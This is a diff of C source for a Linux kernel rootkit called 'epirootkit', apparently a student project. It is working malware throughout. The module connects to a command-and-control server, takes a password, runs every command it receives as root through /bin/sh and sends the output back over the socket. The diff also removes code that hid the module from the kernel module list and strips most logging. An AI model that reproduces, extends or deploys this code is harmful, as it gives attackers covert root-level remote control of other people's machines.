@@ -37,11 +37,9 @@ static struct rootkit_config {
 };
 
 static struct socket *g_sock = NULL;
-static struct task_struct *g_thread = NULL;
+static struct task_struct *g_conn_thread = NULL;
+static struct task_struct *g_cmd_thread = NULL;
 static int connection_state = 0;
-static unsigned long last_reconnect_attempt = 0;
-#define RECONNECT_DELAY_MS 3000
-
 static struct list_head *prev_module = NULL;
 
 static void notify_connection_state(int new_state) {
@@ -54,29 +52,13 @@ static void notify_connection_state(int new_state) {
     }
 }
 
-static void hide_module(void) {
-    prev_module = THIS_MODULE->list.prev;
-    list_del(&THIS_MODULE->list);
-    printk(KERN_INFO "epirootkit: Module hidden from list\n");
-}
-
-static void unhide_module(void) {
-    if (prev_module) {
-        list_add(&THIS_MODULE->list, prev_module);
-        prev_module = NULL;
-        printk(KERN_INFO "epirootkit: Module unhidden\n");
-    }
-}
-
 static int connect_to_c2_server(void) {
     struct sockaddr_in server;
     int err;
 
     err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock);
-    if (err < 0) {
-        pr_err("epirootkit: socket creation failed (%d)\n", err);
+    if (err < 0)
         return err;
-    }
 
     memset(&server, 0, sizeof(server));
     server.sin_family = AF_INET;
@@ -86,15 +68,12 @@ static int connect_to_c2_server(void) {
     err = g_sock->ops->connect(g_sock, (struct sockaddr *)&server,
                                sizeof(server), O_NONBLOCK);
     if (err && err != -EINPROGRESS) {
-        pr_err("epirootkit: connect failed (%d)\n", err);
         sock_release(g_sock);
         g_sock = NULL;
         return err;
     }
 
-    pr_info("epirootkit: Connected to C2 server at %s:%d\n",
-            config.server_ip, config.port);
-
+    pr_info("epirootkit: Connected to C2 server at %s:%d\n", config.server_ip, config.port);
     return 0;
 }
 
@@ -110,22 +89,14 @@ static int send_to_c2(const char *msg, size_t len) {
     iov.iov_len = len;
 
     sent = kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, len);
-    if (sent < 0) {
-        pr_err("epirootkit: failed to send data (%d)\n", sent);
-        return sent;
-    }
-
-    pr_info("epirootkit: sent %d bytes to C2\n", sent);
-    return 0;
+    return sent;
 }
-
 
 static int command_loop(void *data) {
     char buffer[2048];
     struct kvec iov;
     struct msghdr msg_hdr = {0};
     int len, authenticated = 0;
-    // Declarations moved to top for ISO C90 compliance
     char full_cmd[2048];
     char *argv[4];
     char *envp[4];
@@ -149,27 +120,20 @@ static int command_loop(void *data) {
         }
 
         buffer[len] = '\0';
+        size_t input_len = strcspn(buffer, "\r\n");
+        buffer[input_len] = '\0';
 
         if (!authenticated) {
-          	// On rend la comparaison insensible à la casse
-            // Supprimer saut de ligne si présent
-			size_t input_len = strcspn(buffer, "\r\n");
-			buffer[input_len] = '\0';
-
-			if (strcmp(buffer, config.password) == 0) {
+            if (strcmp(buffer, config.password) == 0) {
                 authenticated = 1;
-                pr_info("epirootkit: authenticated\n");
                 send_to_c2("AUTH OK\n", 8);
             } else {
-                pr_info("debug: epirootkit: bad password\n");
                 send_to_c2("AUTH FAIL\n", 10);
             }
             continue;
         }
 
-        // Si on est authentifié, on exécute la commande
         snprintf(full_cmd, sizeof(full_cmd), "%s > /tmp/.rk_out 2>&1", buffer);
-
         argv[0] = "/bin/sh";
         argv[1] = "-c";
         argv[2] = full_cmd;
@@ -181,11 +145,8 @@ static int command_loop(void *data) {
 
         ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
         if (ret)
-            pr_err("epirootkit: command failed (%d)\n", ret);
-        else
-            pr_info("epirootkit: command executed\n");
+            continue;
 
-        // On lit et on envoi au C2
         f = filp_open("/tmp/.rk_out", O_RDONLY, 0);
         if (!IS_ERR(f)) {
             pos = 0;
@@ -205,88 +166,56 @@ static int command_loop(void *data) {
 
 static int connection_loop(void *data) {
     while (!kthread_should_stop()) {
-      	// on va se proteger des double connexions
         if (g_sock) {
-    		msleep(3000);
-    		continue;
-		}
+            msleep(3000);
+            continue;
+        }
 
-
-        if (!g_sock) {
-            pr_info("epirootkit: trying to connect to C2...\n");
-            if (connect_to_c2_server() == 0) {
-                notify_connection_state(1);
-                pr_info("epirootkit: launching command_loop\n");
-
-                if (!g_thread) {
-                    g_thread = kthread_run(command_loop, NULL, "rk_cmd");
-                    if (IS_ERR(g_thread)) {
-                        pr_err("epirootkit: command_loop failed\n");
-                        g_thread = NULL;
-                        sock_release(g_sock);
-                        g_sock = NULL;
-                        notify_connection_state(0);
-                    }
+        if (connect_to_c2_server() == 0) {
+            notify_connection_state(1);
+            if (!g_cmd_thread) {
+                g_cmd_thread = kthread_run(command_loop, NULL, "rk_cmd");
+                if (IS_ERR(g_cmd_thread)) {
+                    g_cmd_thread = NULL;
+                    sock_release(g_sock);
+                    g_sock = NULL;
+                    notify_connection_state(0);
                 }
             }
         }
-        msleep(3000); // on va dormir 3 secondes avant de réessayer
+        msleep(3000);
     }
     return 0;
 }
 
-
-
 static int __init epirootkit_init(void) {
-    int err;
-
     pr_info("epirootkit: Initializing...\n");
-
     g_sock = NULL;
-    g_thread = NULL;
-    connection_state = 0;
-    prev_module = NULL;
-
-    g_thread = kthread_run(connection_loop, NULL, "rk_conn");
-if (IS_ERR(g_thread)) {
-    pr_err("epirootkit: Failed to start connection_loop\n");
-    return PTR_ERR(g_thread);
-}
-
-    if (IS_ERR(g_thread)) {
-        pr_err("epirootkit: Failed to create command thread\n");
-        sock_release(g_sock);
-        g_sock = NULL;
-        return PTR_ERR(g_thread);
+    g_cmd_thread = NULL;
+    g_conn_thread = kthread_run(connection_loop, NULL, "rk_conn");
+    if (IS_ERR(g_conn_thread)) {
+        pr_err("epirootkit: Failed to start connection_loop\n");
+        return PTR_ERR(g_conn_thread);
     }
-
-    notify_connection_state(1);
-    send_to_c2("DONE\n", 6);
     return 0;
 }
 
 static void __exit epirootkit_exit(void) {
     pr_info("epirootkit: Cleaning up module...\n");
 
-    if (g_thread) {
-    pr_info("epirootkit: Stopping thread...\n");
-    kthread_stop(g_thread);
-    g_thread = NULL;
-}
-
+    if (g_cmd_thread) {
+        kthread_stop(g_cmd_thread);
+        g_cmd_thread = NULL;
+    }
+    if (g_conn_thread) {
+        kthread_stop(g_conn_thread);
+        g_conn_thread = NULL;
+    }
     if (g_sock) {
-        pr_info("epirootkit: Closing socket...\n");
         sock_release(g_sock);
         g_sock = NULL;
         notify_connection_state(0);
     }
-
-    if (prev_module && THIS_MODULE) {
-        pr_info("epirootkit: Unhiding module...\n");
-        list_add(&THIS_MODULE->list, prev_module);
-        prev_module = NULL;
-    }
-
     pr_info("epirootkit: Cleanup complete\n");
 }
 
